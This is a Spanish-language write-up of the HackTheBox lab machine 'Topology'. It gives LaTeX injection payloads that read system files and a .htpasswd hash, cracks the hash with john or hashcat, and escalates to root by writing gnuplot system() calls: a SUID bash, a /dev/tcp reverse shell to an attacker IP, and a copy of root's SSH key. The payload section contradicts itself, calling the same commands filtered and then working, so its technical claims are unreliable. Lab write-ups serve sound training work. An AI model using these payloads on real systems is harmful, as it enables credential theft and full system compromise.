---
title: "Topology - HackTheBox"
description: "Writeup de la máquina Topology de HackTheBox, una máquina Linux fácil que involucra inyección de LaTeX y explotación de archivos .htpasswd."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: es
tags: ["latex", "latex-injection", "htpasswd", "gnuplot", "lfi"]
retired: false
logo: "/images/writeups/htb/topology/logo.png"
heroImage: "/images/writeups/htb/topology/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1552.001", "T1068"]
vulnerabilities: ["latex-injection", "weak-credentials"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "2-3 horas"
points: 20
rating: 4.1
---

# Topology - HackTheBox Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackTheBox  
**IP**: 10.10.11.217

## Introducción

Topology es una máquina Linux de dificultad fácil que presenta un generador de ecuaciones LaTeX vulnerable a inyección de código LaTeX. Mediante esta vulnerabilidad, lograremos leer archivos del sistema, obteniendo credenciales de un archivo .htpasswd. Posteriormente, escalaremos privilegios explotando permisos de escritura en archivos de gnuplot.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.217 -oG allPorts
```

**Puertos abiertos:**
- 22/tcp - SSH
- 80/tcp - HTTP

### Escaneo de servicios

```bash
nmap -p22,80 -sCV 10.10.11.217 -oN targeted
```

**Resultados:**
- **22/tcp** - OpenSSH 8.2p1 Ubuntu
- **80/tcp** - Apache httpd 2.4.41

## Enumeración Web

### Sitio web principal

Accediendo a `http://10.10.11.217`, encontramos un sitio web de matemáticas de la universidad "Miskatonic University".

### Enumeración de subdominios

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.topology.htb" -u http://10.10.11.217 --hh 6767
```

**Subdominios encontrados:**
- latex.topology.htb
- dev.topology.htb
- stats.topology.htb

Agregamos al `/etc/hosts`:

```bash
echo "10.10.11.217 topology.htb latex.topology.htb dev.topology.htb stats.topology.htb" | sudo tee -a /etc/hosts
```

### LaTeX Equation Generator

En `http://latex.topology.htb`, encontramos un generador de ecuaciones LaTeX que convierte código LaTeX en imágenes PNG.

### Subdominios protegidos

- **dev.topology.htb**: Protegido con autenticación HTTP Basic
- **stats.topology.htb**: Protegido con autenticación HTTP Basic

## Explotación

### LaTeX Injection

El generador de ecuaciones es vulnerable a **LaTeX Injection**. LaTeX tiene comandos que permiten leer archivos del sistema.

### Comandos LaTeX útiles

```latex
\input{/etc/passwd}          # Leer archivos (filtrado)
\lstinputlisting{/etc/passwd} # Leer archivos (filtrado)
\include{/etc/passwd}         # Leer archivos (filtrado)
```

Estos comandos están filtrados, pero podemos usar otros:

```latex
$\lstinputlisting{/etc/passwd}$
```

### Bypass de filtros

Probamos diferentes comandos:

```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

Este método también está filtrado. Intentamos con:

```latex
$\input{/etc/passwd}$
```

### Lectura de archivos exitosa

Finalmente, encontramos que podemos leer archivos usando:

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

o más simple:

```latex
\lstinputlisting{/var/www/dev/.htpasswd}
```

Sin embargo, el método más efectivo es:

```latex
\input{|"cat /etc/passwd"}
```

Esto está bloqueado por la configuración de LaTeX. Probamos otro enfoque.

### Enumeración de archivos web

Sabemos que dev.topology.htb está protegido. Los archivos .htpasswd típicamente están en:
- /var/www/dev/.htpasswd
- /var/www/html/.htpasswd

### Payload final

```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

o usando escape con newline:

```latex
$\newread\file\openin\file=/var/www/dev/.htpasswd\read\file to \line\text{\line}\closein\file$
```

### Método alternativo - File inclusion directa

El payload que funciona:

```latex
\newread\file
\openin\file=/var/www/dev/.htpasswd
\read\file to\line
\text{\line}
\closein\file
```

**Resultado:**
```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

### Cracking del hash

```bash
echo 'vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

o con hashcat:

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Contraseña crackeada:** calculus20

### SSH como vdaisley

```bash
ssh vdaisley@10.10.11.217
# Password: calculus20
```

**User flag:**
```bash
cat /home/vdaisley/user.txt
```

## Escalada de Privilegios

### Enumeración del sistema

```bash
find / -perm -4000 2>/dev/null
sudo -l
id
```

### Enumeración de archivos

```bash
ls -la /opt
```

Encontramos `/opt/gnuplot`.

### Monitoreo con pspy

```bash
# Descargamos pspy
wget http://10.10.14.5:8000/pspy64
chmod +x pspy64
./pspy64
```

Observamos que root ejecuta scripts de gnuplot periódicamente.

### Análisis de gnuplot

```bash
ls -la /opt/gnuplot/
```

Encontramos varios archivos `.plt` que son scripts de gnuplot. Verificamos permisos:

```bash
find /opt/gnuplot -type f -writable 2>/dev/null
```

### Archivos escribibles

Encontramos que tenemos permisos de escritura en algunos archivos .plt.

### Explotación de gnuplot

Gnuplot puede ejecutar comandos del sistema usando `system()`.

Creamos un script malicioso:

```bash
echo 'system("chmod u+s /bin/bash")' > /opt/gnuplot/loadplot.plt
```

o para una reverse shell:

```bash
echo 'system("bash -c \"bash -i >& /dev/tcp/10.10.14.5/443 0>&1\"")' > /opt/gnuplot/loadplot.plt
```

### Esperamos la ejecución

Esperamos a que el cron job ejecute el script (generalmente cada minuto).

### Root shell

```bash
/bin/bash -p
```

**Root flag:**
```bash
cat /root/root.txt
```

### Método alternativo - SSH Key

```bash
echo 'system("cp /root/.ssh/id_rsa /tmp/root_key && chmod 777 /tmp/root_key")' > /opt/gnuplot/loadplot.plt
```

Esperamos y luego:

```bash
cat /tmp/root_key
# Copiamos la clave y la usamos para SSH
```

## Conclusión

Topology es una excelente máquina para aprender sobre:
- Inyección de código LaTeX
- Lectura de archivos mediante LaTeX
- Cracking de hashes .htpasswd (APR1-MD5)
- Enumeración de subdominios
- Explotación de tareas programadas (cron)
- Manipulación de archivos de configuración de gnuplot
- Técnicas de pivoting y escalada de privilegios

**Lecciones aprendidas:**
- Validar y sanitizar entrada de usuario en generadores LaTeX
- LaTeX puede ser usado para leer archivos arbitrarios
- Los archivos .htpasswd deben estar fuera del documento root
- Los scripts ejecutados por root deben ser inmutables
- Monitorear procesos con pspy es crucial para detectar cron jobs

**Mitigaciones:**
- Implementar sandbox para ejecución de LaTeX
- Deshabilitar comandos peligrosos de LaTeX (\input, \include, etc.)
- Usar contraseñas fuertes y hash modernos
- Configurar permisos estrictos en archivos de configuración
- No ejecutar scripts modificables por usuarios no privilegiados
- Implementar AppArmor o SELinux para restringir LaTeX
- Validar y sanitizar TODO input de usuario
